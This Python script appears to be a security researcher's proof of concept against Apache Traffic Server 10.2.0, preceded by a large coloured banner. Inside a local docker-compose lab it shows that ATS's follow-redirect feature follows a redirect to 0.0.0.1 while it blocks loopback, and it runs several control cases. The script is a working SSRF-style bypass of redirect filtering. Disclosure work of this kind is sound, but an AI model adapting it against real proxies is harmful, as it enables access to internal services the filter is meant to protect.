#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: ats-redirect-zero-net (High: 8.6)
#  Vendor: Apache Traffic Server (ASF)
#  Versions: Apache Traffic Server 10.2.0 (b1df7334)
#  Impact: Follow-redirect treats 0.0.0.0/8 as routable
#  Requires: redirect.actions routable:follow; number_of_redirections 1
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "ats-redirect-zero-net"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove ATS follow-redirect treats 0.0.0.1 as routable while loopback RETURN."""

import http.client
import os
import subprocess
import time
from dataclasses import dataclass
from pathlib import Path

LABEL = "ats-redirect-zero-net"
WITNESS = "ATS-REDIRECT-ZERO-NET-WITNESS"
LOOPBACK_SECRET = "LOOPBACK-ONLY-SECRET"
FOLLOW_OK = "FOLLOW-OK"
ATS_HOST = os.environ.get("ATS_HOST", "127.0.0.1")
ATS_PORT = int(os.environ.get("ATS_PORT", "18790"))
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", "ats-redirect-zero-net")
HERE = Path(__file__).resolve().parent
READY_TIMEOUT = int(os.environ.get("ATS_READY_TIMEOUT", "120"))


@dataclass(frozen=True)
class HttpResult:
    status: int
    body: str
    location: str
    headers: str


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> None:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    raise SystemExit(1)


def success(detail: str) -> None:
    log(f"SUCCESS {LABEL} {detail} {WITNESS}")
    raise SystemExit(0)


def compose(*args: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
    )


def ats_http(host_header: str, path: str = "/", timeout: int = 20) -> HttpResult:
    conn = http.client.HTTPConnection(ATS_HOST, ATS_PORT, timeout=timeout)
    try:
        conn.request("GET", path, headers={"Host": host_header, "Connection": "close"})
        resp = conn.getresponse()
        body = resp.read().decode("utf-8", "replace")
        location = resp.getheader("Location") or ""
        headers = "\n".join(f"{k}: {v}" for k, v in resp.getheaders())
        return HttpResult(status=resp.status, body=body, location=location, headers=headers)
    finally:
        conn.close()


def wait_ats() -> None:
    deadline = time.time() + READY_TIMEOUT
    last = "none"
    while time.time() < deadline:
        try:
            result = ats_http("no-such.lab", "/", timeout=5)
            last = f"{result.status} {result.body[:80]!r}"
            if result.status in (400, 403, 404, 502, 503) or result.status >= 200:
                log(f"ats-ready {last}")
                return
        except (OSError, http.client.HTTPException) as exc:
            last = str(exc)
        log(f"ats-wait {last}")
        time.sleep(2)
    fail(f"ATS not ready after {READY_TIMEOUT}s last={last}")


def wait_witness() -> None:
    deadline = time.time() + READY_TIMEOUT
    last = "none"
    while time.time() < deadline:
        proc = compose("exec", "-T", "witness", "cat", "/tmp/witness-ready", timeout=20)
        out = ((proc.stdout or "") + (proc.stderr or "")).strip()
        last = f"rc={proc.returncode} {out[:160]!r}"
        if proc.returncode == 0 and "ready" in out:
            log(f"witness-ready {last}")
            return
        log(f"witness-wait {last}")
        time.sleep(2)
    dump_logs()
    fail("kernel does not deliver 0.0.0.1 to witness (cannot bind 0.0.0.1)")


def exec_curl(url: str) -> str:
    proc = compose(
        "exec",
        "-T",
        "witness",
        "python3",
        "-c",
        (
            "import urllib.request,sys;"
            f"print(urllib.request.urlopen({url!r}, timeout=5).read().decode())"
        ),
        timeout=30,
    )
    out = (proc.stdout or "") + (proc.stderr or "")
    log(f"in-netns-get {url} rc={proc.returncode} body={out[:200]!r}")
    return out


def dump_logs() -> None:
    proc = compose("logs", "--tail=80", "ats", "witness", timeout=30)
    blob = ((proc.stdout or "") + (proc.stderr or ""))[-4000:]
    log("lab-logs " + blob)


def main() -> int:
    log(
        f"lab {LABEL} ats={ATS_HOST}:{ATS_PORT} "
        f"project={COMPOSE_PROJECT} follow=number_of_redirections=1 remap_required=1"
    )
    wait_ats()
    wait_witness()

    zero_probe = exec_curl("http://0.0.0.1:18080/w")
    if WITNESS not in zero_probe:
        dump_logs()
        fail("kernel does not deliver 0.0.0.1 to witness (cannot bind 0.0.0.1)")

    loop_probe = exec_curl("http://127.0.0.1:18080/loop")
    if LOOPBACK_SECRET not in loop_probe:
        dump_logs()
        fail("loopback witness not bound on 127.0.0.1:18080")

    routable_probe = exec_curl("http://203.0.113.10:18080/ok")
    if FOLLOW_OK not in routable_probe:
        log("IOC routable TEST-NET oracle not bound; control-c may be skipped")

    control_b = ats_http("origin-b.lab")
    log(
        f"control-b loopback status={control_b.status} location={control_b.location!r} "
        f"body={control_b.body[:200]!r}"
    )
    if LOOPBACK_SECRET in control_b.body:
        fail("loopback Location was followed (expected RETURN)")
    if control_b.status not in (301, 302, 303, 307, 308):
        dump_logs()
        fail(f"loopback control expected 3xx RETURN got {control_b.status}")
    log("control-b loopback RETURN")

    control_c = ats_http("origin-c.lab")
    log(
        f"control-c routable status={control_c.status} location={control_c.location!r} "
        f"body={control_c.body[:200]!r}"
    )
    follow_ok = FOLLOW_OK in control_c.body and control_c.status == 200
    if not follow_ok:
        log("IOC control-c did not follow TEST-NET (private compose hosts RETURN by default)")
        dump_logs()
        fail("routable follow control failed; leftover map may not be evaluated")
    log("control-c routable FOLLOW")

    control_any = ats_http("origin-any.lab")
    log(
        f"control-any INADDR_ANY status={control_any.status} location={control_any.location!r} "
        f"body={control_any.body[:200]!r}"
    )
    if WITNESS in control_any.body or FOLLOW_OK in control_any.body:
        fail("INADDR_ANY 0.0.0.0 was followed")
    if control_any.status not in (400, 403):
        log(f"IOC INADDR_ANY expected 400/403 got {control_any.status}")
    else:
        log("control-any INADDR_ANY rejected before action map")

    poc = ats_http("origin-a.lab")
    log(f"poc-zero-net status={poc.status} location={poc.location!r} body={poc.body[:300]!r}")
    if WITNESS not in poc.body:
        dump_logs()
        fail(f"ATS did not follow Location 0.0.0.1 status={poc.status}")
    if poc.status != 200:
        dump_logs()
        fail(f"follow to 0.0.0.1 returned {poc.status} with witness")

    success(
        "follow-0.0.0.1=yes loopback-return=yes routable-follow=yes "
        f"inaddr-any={control_any.status} remap_required=1"
    )
    return 0


if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        raise
    except Exception as exc:  # noqa: BLE001 - last-line FAIL contract
        fail(f"exception {type(exc).__name__}: {exc}")

